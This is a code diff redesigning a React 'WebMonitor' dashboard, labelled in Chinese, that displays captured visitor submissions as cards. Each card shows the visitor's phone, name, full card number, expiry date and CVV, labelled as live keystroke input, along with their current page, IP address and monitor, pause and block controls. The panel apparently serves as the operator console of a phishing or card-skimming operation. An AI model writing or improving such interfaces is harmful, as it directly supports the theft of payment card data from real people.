@@ -197,122 +197,141 @@ export function WebMonitor() {
       </div>
 
       <div className="p-6">
-        {/* Clean Table Layout - exactly like reference image */}
-        <div className="space-y-1">
+        {/* Card Layout with Borders -按照用户要求的信息顺序 */}
+        <div className="space-y-4">
           {submissionData.map((submission, index) => (
-            <div key={submission.id} className="bg-white hover:bg-gray-50 transition-colors">
-              {/* Main Row */}
-              <div className="px-4 py-3">
-                <div className="grid grid-cols-12 gap-4 items-center text-sm">
-                  {/* Column 1: ID & Status */}
-                  <div className="col-span-2">
-                    <div className="flex items-center gap-2 mb-1">
-                      <Badge
-                        variant="outline"
-                        className={`cursor-pointer text-xs px-2 py-1 ${
-                          submission.status === "processing" ? "bg-blue-50 text-blue-600 border-blue-200" :
-                          submission.status === "submitted" ? "bg-orange-50 text-orange-600 border-orange-200" :
-                          submission.status === "verified" ? "bg-green-50 text-green-600 border-green-200" :
-                          submission.status === "pending_review" ? "bg-yellow-50 text-yellow-700 border-yellow-200" :
-                          "bg-red-50 text-red-600 border-red-200"
-                        }`}
-                        onClick={() => toggleExpanded(submission.id)}
-                      >
-                        编号: {submission.id}
-                      </Badge>
-                    </div>
-                    <div className="text-xs text-muted-foreground">{submission.statusText}</div>
+            <div key={submission.id} className="bg-white border border-gray-200 rounded-lg shadow-sm hover:shadow-md transition-shadow p-6">
+              {/* 顶部：编号、前台页面、正在payment页面 */}
+              <div className="flex items-center justify-between mb-4 pb-4 border-b border-gray-100">
+                <div className="flex items-center gap-6">
+                  <div className="flex items-center gap-2">
+                    <span className="text-sm text-muted-foreground">编号:</span>
+                    <Badge
+                      variant="outline"
+                      className={`cursor-pointer text-sm px-3 py-1 font-mono ${
+                        submission.status === "processing" ? "bg-blue-50 text-blue-600 border-blue-300" :
+                        submission.status === "submitted" ? "bg-orange-50 text-orange-600 border-orange-300" :
+                        submission.status === "verified" ? "bg-green-50 text-green-600 border-green-300" :
+                        submission.status === "pending_review" ? "bg-yellow-50 text-yellow-700 border-yellow-300" :
+                        "bg-red-50 text-red-600 border-red-300"
+                      }`}
+                      onClick={() => toggleExpanded(submission.id)}
+                    >
+                      {submission.id}
+                    </Badge>
                   </div>
 
-                  {/* Column 2: Realtime Input */}
-                  <div className="col-span-3">
-                    {submission.realtimeInput && (
-                      <div className="bg-red-50 px-3 py-2 rounded border border-red-200">
-                        <div className="flex items-center gap-1 text-xs text-red-600 mb-1">
-                          🔴 实时输入 <span className="animate-pulse">●</span>
-                        </div>
-                        <div className="grid grid-cols-2 gap-2 text-xs">
-                          {submission.realtimeInput.phone && (
-                            <div className="font-mono">📱 {submission.realtimeInput.phone}</div>
-                          )}
-                          {submission.realtimeInput.cardNumber && (
-                            <div className="font-mono">💳 {submission.realtimeInput.cardNumber}</div>
-                          )}
-                          {submission.realtimeInput.expiryDate && (
-                            <div className="font-mono">📅 {submission.realtimeInput.expiryDate}</div>
-                          )}
-                          {submission.realtimeInput.cvv && (
-                            <div className="font-mono">🔒 {submission.realtimeInput.cvv}</div>
-                          )}
-                        </div>
-                      </div>
-                    )}
+                  <div className="flex items-center gap-2">
+                    <span className="text-sm text-muted-foreground">前台页面:</span>
+                    <span className="text-sm font-medium">{submission.websiteName}</span>
                   </div>
 
-                  {/* Column 3: Website & Type */}
-                  <div className="col-span-2">
-                    <div className="font-medium text-foreground">{submission.websiteName}</div>
-                    <div className="text-xs text-muted-foreground">{submission.currentPage}</div>
-                    <div className="flex items-center gap-1 mt-1">
-                      {getSubmissionTypeIcon(submission.submissionType)}
-                      <span className="text-xs">{getSubmissionTypeName(submission.submissionType)}</span>
-                    </div>
+                  <div className="flex items-center gap-2">
+                    <span className="text-sm text-muted-foreground">正在页面:</span>
+                    <span className="text-sm font-medium text-blue-600">{submission.currentPage}</span>
                   </div>
+                </div>
 
-                  {/* Column 4: User */}
-                  <div className="col-span-1">
-                    <div className="text-sm">用户: {submission.userName}</div>
+                <div className="flex items-center gap-3">
+                  <Badge
+                    variant="outline"
+                    className={`text-xs ${
+                      submission.riskLevel === "high" ? "bg-red-50 text-red-600 border-red-200" :
+                      submission.riskLevel === "medium" ? "bg-yellow-50 text-yellow-600 border-yellow-200" :
+                      "bg-green-50 text-green-600 border-green-200"
+                    }`}
+                  >
+                    {submission.riskLevel === "high" ? "🔴 高风险" :
+                     submission.riskLevel === "medium" ? "🟡 中风险" :
+                     "🟢 低风险"}
+                  </Badge>
+                  <div className="text-sm text-muted-foreground">{submission.statusText}</div>
+                </div>
+              </div>
+
+              {/* 中部：卡的类型、手机号、姓名、卡号、有效期、CVV */}
+              <div className="grid grid-cols-6 gap-6 mb-4">
+                <div>
+                  <div className="text-xs text-muted-foreground mb-1">卡的类型</div>
+                  <div className="flex items-center gap-1">
+                    {getSubmissionTypeIcon(submission.submissionType)}
+                    <span className="text-sm font-medium">{getSubmissionTypeName(submission.submissionType)}</span>
                   </div>
+                </div>
 
-                  {/* Column 5: Progress */}
-                  <div className="col-span-2">
-                    {submission.progress ? (
-                      <div>
-                        <div className="flex justify-between text-xs mb-1">
-                          <span>进度</span>
-                          <span className="font-medium">{submission.progressText}</span>
-                        </div>
-                        <Progress value={submission.progress} className="h-2" />
-                      </div>
-                    ) : (
-                      <span className="text-xs text-muted-foreground">等待处理...</span>
-                    )}
+                <div>
+                  <div className="text-xs text-muted-foreground mb-1">手机号</div>
+                  <div className="text-sm font-mono">
+                    📱 {submission.realtimeInput?.phone || 'N/A'}
                   </div>
+                </div>
 
-                  {/* Column 6: Risk & Actions */}
-                  <div className="col-span-2">
-                    <div className="flex items-center justify-between">
-                      <Badge
-                        variant="outline"
-                        className={`text-xs ${
-                          submission.riskLevel === "high" ? "bg-red-50 text-red-600 border-red-200" :
-                          submission.riskLevel === "medium" ? "bg-yellow-50 text-yellow-600 border-yellow-200" :
-                          "bg-green-50 text-green-600 border-green-200"
-                        }`}
-                      >
-                        {submission.riskLevel === "high" ? "🔴 高风险" :
-                         submission.riskLevel === "medium" ? "🟡 中风险" :
-                         "🟢 低风险"}
-                      </Badge>
-                      <div className="flex gap-1">
-                        <Button variant="outline" size="sm" className="text-xs h-6 px-2">
-                          监控
-                        </Button>
-                        <Button variant="outline" size="sm" className="text-xs h-6 px-2">
-                          阻止
-                        </Button>
-                      </div>
-                    </div>
-                    <div className="text-xs text-muted-foreground mt-1">
-                      数据: {submission.dataSize} • {submission.fieldsCount} 字段
-                    </div>
+                <div>
+                  <div className="text-xs text-muted-foreground mb-1">姓名</div>
+                  <div className="text-sm font-medium">
+                    👤 {submission.userName}
+                  </div>
+                </div>
+
+                <div>
+                  <div className="text-xs text-muted-foreground mb-1">卡号</div>
+                  <div className="text-sm font-mono">
+                    💳 {submission.realtimeInput?.cardNumber || 'N/A'}
+                  </div>
+                </div>
+
+                <div>
+                  <div className="text-xs text-muted-foreground mb-1">有效期</div>
+                  <div className="text-sm font-mono">
+                    📅 {submission.realtimeInput?.expiryDate || 'N/A'}
+                  </div>
+                </div>
+
+                <div>
+                  <div className="text-xs text-muted-foreground mb-1">CVV</div>
+                  <div className="text-sm font-mono">
+                    🔒 {submission.realtimeInput?.cvv || 'N/A'}
                   </div>
                 </div>
               </div>
 
-              {/* Expanded Details */}
+              {/* 底部：处理进度和操作按钮 */}
+              <div className="flex items-center justify-between pt-4 border-t border-gray-100">
+                <div className="flex items-center gap-6">
+                  {submission.progress ? (
+                    <div className="min-w-[200px]">
+                      <div className="flex justify-between text-xs mb-1">
+                        <span className="text-muted-foreground">处理进度</span>
+                        <span className="font-medium text-blue-600">{submission.progressText}</span>
+                      </div>
+                      <Progress value={submission.progress} className="h-2" />
+                    </div>
+                  ) : (
+                    <span className="text-sm text-muted-foreground">等待处理...</span>
+                  )}
+
+                  <div className="text-xs text-muted-foreground">
+                    数据: {submission.dataSize} • {submission.fieldsCount} 字段 • IP: {submission.ipAddress}
+                  </div>
+                </div>
+
+                <div className="flex gap-2">
+                  <Button variant="outline" size="sm" className="text-sm px-4">
+                    📊 监控
+                  </Button>
+                  <Button variant="outline" size="sm" className="text-sm px-4">
+                    ⏸️ 暂停
+                  </Button>
+                  <Button variant="destructive" size="sm" className="text-sm px-4">
+                    🚫 阻止
+                  </Button>
+                </div>
+              </div>
+
+              {/* 展开的详细信息 */}
               {expandedItems.has(submission.id) && (
-                <div className="px-4 py-3 bg-gray-50 border-t border-gray-200">
+                <div className="mt-4 pt-4 border-t border-gray-200 bg-gray-50 -mx-6 -mb-6 px-6 py-4 rounded-b-lg">
+                  <h4 className="text-sm font-medium text-foreground mb-3">📋 详细信息</h4>
                   <div className="grid grid-cols-4 gap-4 text-xs">
                     <div>
                       <span className="text-muted-foreground">提交时间: </span>
